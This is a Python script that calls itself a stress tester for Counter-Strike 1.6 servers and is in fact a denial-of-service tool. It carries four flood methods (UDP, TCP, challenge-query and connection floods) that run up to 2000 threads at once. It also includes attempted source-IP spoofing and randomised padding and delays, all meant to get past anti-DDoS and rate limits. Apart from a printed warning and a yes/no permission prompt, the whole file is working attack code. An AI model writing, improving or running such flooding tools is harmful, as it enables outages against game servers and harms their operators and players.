#!/usr/bin/env python3
"""
CS 1.6 ULTIMATE SERVER STRESS TESTER - NUCLEAR EDITION
Author: Anonymous
Description: Advanced stress testing tool for Counter-Strike 1.6 servers with anti-DDoS bypass
"""

import sys
import os
import time
import random
import socket
import threading
import argparse
import select
import struct
import zlib
import hashlib
from concurrent.futures import ThreadPoolExecutor
from multiprocessing import cpu_count, Manager
from datetime import datetime
from fake_useragent import UserAgent

# ========================
# GLOBAL CONFIGURATION
# ========================
VERSION = "1.6-NUCLEAR"
MAX_THREADS = 2000  # Maximum worker threads
CONNECTION_TIMEOUT = 5  # Seconds
DEFAULT_PORT = 27015  # Default CS 1.6 server port
DEBUG_MODE = False  # Debug output
MAX_RETRIES = 3  # Max retries for failed requests
IP_SPOOFING = True  # Enable IP spoofing
ROTATE_USER_AGENTS = True  # Rotate user agents
USE_PROXY = False  # Enable proxy rotation

# Global running flag
RUNNING = True

# ========================
# CS 1.6 PROTOCOL CONSTANTS
# ========================
PROTOCOL_VERSION = 47
CHALLENGE_RESPONSE = -1
A2S_INFO = b"\xFF\xFF\xFF\xFFTSource Engine Query\x00"
A2S_PLAYER = b"\xFF\xFF\xFF\xFFT\x11"
A2S_RULES = b"\xFF\xFF\xFF\xFFT\x12"
A2S_SERVERQUERY_GETCHALLENGE = b"\xFF\xFF\xFF\xFFT\x57"

# ========================
# PROTECTION BYPASS CLASS
# ========================
class ProtectionBypass:
    """
    Advanced techniques for bypassing anti-DDoS and rate limits
    """
    
    @staticmethod
    def generate_spoofed_ip():
        """Generate random IP for spoofing"""
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    
    @staticmethod
    def get_random_user_agent():
        """Get random user agent"""
        ua = UserAgent()
        return ua.random
    
    @staticmethod
    def get_random_referer():
        """Generate random referer"""
        referers = [
            'https://www.google.com/',
            'https://www.youtube.com/',
            'https://www.facebook.com/',
            'https://www.twitch.tv/',
            'https://www.steamcommunity.com/'
        ]
        return random.choice(referers)
    
    @staticmethod
    def get_random_proxy():
        """Get random proxy (if enabled)"""
        if not USE_PROXY:
            return None
        
        proxies = [
            # Add your proxy list here
        ]
        return random.choice(proxies) if proxies else None

# ========================
# PAYLOAD GENERATOR (ENHANCED)
# ========================
class PayloadGenerator:
    """
    Generate CS 1.6 protocol payloads with evasion techniques
    """
    
    @staticmethod
    def generate_info_request():
        """Generate A2S_INFO request with random padding"""
        padding = os.urandom(random.randint(0, 32))
        return A2S_INFO + padding
    
    @staticmethod
    def generate_player_request(challenge):
        """Generate A2S_PLAYER request with challenge"""
        padding = os.urandom(random.randint(0, 16))
        return A2S_PLAYER + struct.pack("<i", challenge) + padding
    
    @staticmethod
    def generate_rules_request(challenge):
        """Generate A2S_RULES request with challenge"""
        padding = os.urandom(random.randint(0, 16))
        return A2S_RULES + struct.pack("<i", challenge) + padding
    
    @staticmethod
    def generate_challenge_request():
        """Generate challenge request with random padding"""
        padding = os.urandom(random.randint(0, 24))
        return A2S_SERVERQUERY_GETCHALLENGE + padding
    
    @staticmethod
    def generate_connection_flood():
        """Generate connection flood payload with random data"""
        payload_types = [
            b"\xFF\xFF\xFF\xFF\x55",  # Connection attempt
            b"\xFF\xFF\xFF\xFF\x42",  # Game event
            b"\xFF\xFF\xFF\xFF\x43",  # Player update
            b"\xFF\xFF\xFF\xFF\x44"   # Map data
        ]
        base = random.choice(payload_types)
        random_data = os.urandom(random.randint(128, 512))
        return base + random_data
    
    @staticmethod
    def generate_legit_looking_payload():
        """Generate payload that looks like legit player traffic"""
        payload_types = [
            (b"\xFF\xFF\xFF\xFF\x55", 128, 256),  # Connection attempt
            (b"\xFF\xFF\xFF\xFF\x42", 192, 320),  # Game event
            (b"\xFF\xFF\xFF\xFF\x43", 160, 288),  # Player update
            (b"\xFF\xFF\xFF\xFF\x44", 256, 384)   # Map data
        ]
        base, min_size, max_size = random.choice(payload_types)
        random_data = os.urandom(random.randint(min_size, max_size))
        return base + random_data

# ========================
# ATTACK METHODS (ENHANCED)
# ========================
class AttackMethods:
    """
    Different attack methods for CS 1.6 servers with advanced bypass
    """
    
    @staticmethod
    def udp_flood(target_ip, target_port, stats):
        """UDP flood attack with IP spoofing"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(CONNECTION_TIMEOUT)
            
            while RUNNING:
                try:
                    payload = PayloadGenerator.generate_legit_looking_payload()
                    
                    # Spoof source IP if enabled
                    if IP_SPOOFING:
                        src_port = random.randint(1024, 65535)
                        src_ip = ProtectionBypass.generate_spoofed_ip()
                        sock.bind((src_ip, src_port))
                    
                    sock.sendto(payload, (target_ip, target_port))
                    stats['total'] += 1
                    stats['success'] += 1
                    
                    if DEBUG_MODE:
                        print(f"[UDP] Sent {len(payload)} bytes to {target_ip}:{target_port}")
                    
                    # Random delay to bypass rate limits
                    time.sleep(random.uniform(0.01, 0.1))
                except Exception as e:
                    stats['errors'] += 1
                    if DEBUG_MODE:
                        print(f"[UDP Error] {e}")
                    time.sleep(0.5)
        finally:
            sock.close()
    
    @staticmethod
    def tcp_flood(target_ip, target_port, stats):
        """TCP flood attack with connection randomization"""
        while RUNNING:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(CONNECTION_TIMEOUT)
                
                # Randomize connection parameters
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 1)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 3)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 5)
                
                sock.connect((target_ip, target_port))
                
                # Send multiple payloads with random delays
                for _ in range(random.randint(3, 10)):
                    try:
                        payload = PayloadGenerator.generate_legit_looking_payload()
                        sock.send(payload)
                        stats['total'] += 1
                        stats['success'] += 1
                        
                        if DEBUG_MODE:
                            print(f"[TCP] Sent {len(payload)} bytes to {target_ip}:{target_port}")
                        
                        time.sleep(random.uniform(0.05, 0.2))
                    except Exception as e:
                        stats['errors'] += 1
                        if DEBUG_MODE:
                            print(f"[TCP Send Error] {e}")
                        break
                
            except Exception as e:
                stats['errors'] += 1
                if DEBUG_MODE:
                    print(f"[TCP Connect Error] {e}")
                time.sleep(0.5)
            finally:
                try:
                    sock.close()
                except:
                    pass
    
    @staticmethod
    def challenge_flood(target_ip, target_port, stats):
        """Challenge request flood with response handling"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(CONNECTION_TIMEOUT)
            
            while RUNNING:
                try:
                    # Send challenge request
                    sock.sendto(PayloadGenerator.generate_challenge_request(), (target_ip, target_port))
                    stats['total'] += 1
                    
                    # Wait for response with timeout
                    ready = select.select([sock], [], [], 0.5)
                    if ready[0]:
                        data, addr = sock.recvfrom(4096)
                        if len(data) > 4 and data[4] == 0x41:  # Challenge response
                            challenge = struct.unpack("<i", data[5:9])[0]
                            
                            # Follow up with player/rules requests
                            sock.sendto(PayloadGenerator.generate_player_request(challenge), (target_ip, target_port))
                            sock.sendto(PayloadGenerator.generate_rules_request(challenge), (target_ip, target_port))
                            stats['success'] += 3
                            
                            if DEBUG_MODE:
                                print(f"[Challenge] Sent 3 requests to {target_ip}:{target_port}")
                        else:
                            stats['errors'] += 1
                    else:
                        stats['errors'] += 1
                    
                    # Random delay to bypass rate limits
                    time.sleep(random.uniform(0.05, 0.15))
                except Exception as e:
                    stats['errors'] += 1
                    if DEBUG_MODE:
                        print(f"[Challenge Error] {e}")
                    time.sleep(0.5)
        finally:
            sock.close()
    
    @staticmethod
    def connection_flood(target_ip, target_port, stats):
        """TCP connection flood with randomization"""
        while RUNNING:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                
                # Randomize socket options
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, random.randint(0, 1))
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, random.randint(0, 1))
                
                sock.connect((target_ip, target_port))
                
                # Send multiple payloads before closing
                for _ in range(random.randint(3, 10)):
                    try:
                        payload = PayloadGenerator.generate_legit_looking_payload()
                        sock.send(payload)
                        stats['total'] += 1
                        stats['success'] += 1
                        
                        if DEBUG_MODE:
                            print(f"[Connection] Sent {len(payload)} bytes to {target_ip}:{target_port}")
                        
                        time.sleep(random.uniform(0.1, 0.3))
                    except Exception as e:
                        stats['errors'] += 1
                        if DEBUG_MODE:
                            print(f"[Connection Send Error] {e}")
                        break
                
            except Exception as e:
                stats['errors'] += 1
                if DEBUG_MODE:
                    print(f"[Connection Error] {e}")
                time.sleep(0.5)
            finally:
                try:
                    sock.close()
                except:
                    pass

# ========================
# ATTACK CONTROLLER (ENHANCED)
# ========================
class CS16StressTester:
    """
    Main controller for CS 1.6 server stress testing
    """
    
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.threads = []
        self.manager = Manager()
        self.stats = self.manager.dict({
            'start_time': time.time(),
            'total': 0,
            'success': 0,
            'errors': 0,
            'methods': {
                'udp': 0,
                'tcp': 0,
                'challenge': 0,
                'connection': 0
            }
        })
    
    def start_attack(self, method='udp', threads=MAX_THREADS):
        """Start the selected attack method"""
        print(f"\n[!] Starting {method.upper()} attack on {self.target_ip}:{self.target_port}")
        print(f"[!] Threads: {threads}")
        print("[!] Press CTRL+C to stop the attack\n")
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            
            try:
                # Start attack threads
                for i in range(threads):
                    if method == 'udp':
                        futures.append(executor.submit(
                            AttackMethods.udp_flood,
                            self.target_ip,
                            self.target_port,
                            self.stats
                        ))
                    elif method == 'tcp':
                        futures.append(executor.submit(
                            AttackMethods.tcp_flood,
                            self.target_ip,
                            self.target_port,
                            self.stats
                        ))
                    elif method == 'challenge':
                        futures.append(executor.submit(
                            AttackMethods.challenge_flood,
                            self.target_ip,
                            self.target_port,
                            self.stats
                        ))
                    elif method == 'connection':
                        futures.append(executor.submit(
                            AttackMethods.connection_flood,
                            self.target_ip,
                            self.target_port,
                            self.stats
                        ))
                
                # Monitor threads
                while RUNNING:
                    time.sleep(1)
                    self.print_stats()
                    
            except KeyboardInterrupt:
                print("\n[!] Stopping attack...")
                global RUNNING
                RUNNING = False
                
                # Wait for threads to finish
                for future in futures:
                    future.cancel()
    
    def print_stats(self):
        """Print current attack statistics"""
        elapsed = time.time() - self.stats['start_time']
        rps = self.stats['total'] / elapsed if elapsed > 0 else 0
        
        print("\n" + "="*80)
        print(f"CS 1.6 STRESS TEST STATS - {datetime.now().strftime('%H:%M:%S')}")
        print(f"Target: {self.target_ip}:{self.target_port}")
        print(f"Elapsed: {elapsed:.1f}s | RPS: {rps:.1f}")
        print("-"*80)
        print(f"Total Requests: {self.stats['total']}")
        print(f"Successful: {self.stats['success']} | Errors: {self.stats['errors']}")
        print("="*80)

# ========================
# COMMAND LINE INTERFACE
# ========================
def get_user_input():
    """Get target IP and port from user"""
    parser = argparse.ArgumentParser(description=f"CS 1.6 Ultimate Stress Tester v{VERSION}")
    parser.add_argument('ip', help="Target server IP address")
    parser.add_argument('-p', '--port', type=int, default=DEFAULT_PORT,
                       help="Target server port")
    parser.add_argument('-m', '--method', default='udp',
                       choices=['udp', 'tcp', 'challenge', 'connection'],
                       help="Attack method to use")
    parser.add_argument('-t', '--threads', type=int, default=MAX_THREADS,
                       help="Number of threads to use")
    parser.add_argument('--debug', action='store_true',
                       help="Enable debug output")
    parser.add_argument('--no-spoof', action='store_false', dest='spoof',
                       help="Disable IP spoofing")
    parser.add_argument('--proxy', action='store_true',
                       help="Enable proxy rotation")
    
    return parser.parse_args()

def validate_ip(ip):
    """Validate IP address"""
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def main():
    """Main entry point"""
    args = get_user_input()
    
    if not validate_ip(args.ip):
        print("Error: Invalid IP address format")
        return
    
    global DEBUG_MODE, IP_SPOOFING, USE_PROXY, RUNNING
    DEBUG_MODE = args.debug
    IP_SPOOFING = args.spoof
    USE_PROXY = args.proxy
    RUNNING = True
    
    print("\n" + "="*80)
    print(f"CS 1.6 ULTIMATE STRESS TESTER v{VERSION}")
    print("="*80)
    print("WARNING: THIS IS A POWERFUL STRESS TESTING TOOL")
    print("ONLY USE ON SERVERS YOU OWN WITH EXPLICIT PERMISSION")
    print("MISUSE MAY VIOLATE LAWS AND TERMS OF SERVICE")
    print("="*80 + "\n")
    
    confirm = input("Do you have legal permission to test this server? (yes/no): ").lower()
    if confirm != 'yes':
        print("Test cancelled.")
        return
    
    # Start attack
    tester = CS16StressTester(args.ip, args.port)
    
    try:
        tester.start_attack(method=args.method, threads=args.threads)
    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user")
    except Exception as e:
        print(f"\n[!] Error: {e}")
    finally:
        RUNNING = False
        tester.print_stats()

if __name__ == "__main__":
    # Check for root privileges if spoofing is enabled
    if IP_SPOOFING and os.geteuid() != 0:
        print("Error: IP spoofing requires root privileges")
        sys.exit(1)
    
    main()
